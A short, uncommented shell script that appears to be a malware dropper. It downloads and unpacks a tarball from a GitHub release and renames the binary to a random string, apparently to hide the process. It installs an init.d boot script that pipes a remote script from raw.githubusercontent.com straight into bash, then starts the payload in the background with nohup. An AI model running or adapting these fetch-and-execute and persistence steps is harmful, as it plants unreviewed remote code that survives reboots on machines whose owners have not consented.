cd /
wget https://github.com/modums/roreut/releases/download/v0.0.3/source.tar
tar -xvf source.tar
cd /source
variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
mv truces $variable1
sed -i "s/oodo/${variable1} -t=500 -n=${variable1}/g" ./static.sh
cd /etc/init.d
echo "bash <(curl -s -L https://raw.githubusercontent.com/modums/roreut/main/sunsor.sh)" > emitter.sh
chmod a+x emitter.sh
update-rc.d emitter.sh defaults
rm -rf source.tar
cd /source
nohup ./static.sh
ps -ef | grep source
